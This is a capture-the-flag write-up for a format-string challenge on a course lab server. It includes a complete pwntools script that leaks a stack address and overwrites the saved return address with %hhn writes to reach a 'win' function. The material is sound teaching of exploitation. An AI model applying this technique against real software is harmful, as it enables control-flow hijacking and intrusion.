# Challenge `Return Address Again` writeup

- Vulnerability:
  - Format string
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port 23198
- Impact:
  - Allows attacker to call arbitrary functions

## Steps to reproduce

1. In this example we must change the saved `eip` register to the address of the `win` function
2. The addresses on server differ from the local addresses. The remote `buffer` address can be obtain by inputting `AAAA.%08x` and is `0xffffdc7c`
3. The local `buffer` address is `0xffffcfcc` and the `eip` address is `0xffffd05c`
4. We can calculate the difference between these and use it to find the remote `eip` address, subsequently changing it

The code used was the following:


```py
from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 23198, timeout=100)

elf = ELF("08_return")
win_address = elf.symbols['win']

local_buffer = 0xffffcfcc
local_eip_adress =  0xffffd05c

diff = (local_buffer - local_eip_adress)

leaked_buffer = 0xffffdc7c
eip_address =  leaked_buffer - diff

offset1 = win_address & 0xff
offset2 = win_address >> 8 & 0xff
offset3 = win_address >> 16 & 0xff
offset4 = win_address >> 24 & 0xff

payload = p32(eip_address) + p32(eip_address + 2) + p32(eip_address + 1) + p32(eip_address + 3) +  \
    "%0{0}x%7$hhn%0{1}x%8$hhn%0{2}x%9$hhn%0{3}x%10$hhn".format(
        (offset1 - 16) % 256, (offset3 - offset1) % 256, (offset2-offset3) % 256, (offset4 - offset2) % 256).encode()

s.sendline(payload)
print(s.recvall())
```
